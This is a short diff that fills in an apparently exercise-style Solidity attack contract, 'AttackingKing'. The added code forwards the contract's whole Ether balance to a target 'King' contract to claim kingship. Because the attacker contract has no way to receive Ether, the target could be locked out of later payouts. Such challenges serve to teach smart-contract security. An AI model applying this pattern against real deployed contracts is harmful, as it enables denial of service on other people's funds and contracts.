@@ -5,12 +5,16 @@ import "hardhat/console.sol";
 
 contract AttackingKing {
     address public contractAddress;
+    King public kingContract;
 
     constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
+        kingContract = King(payable(contractAddress));
     }
 
     function hackContract() external {
         // Code me!
+        (bool sent,) = address(kingContract).call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
     }
 }
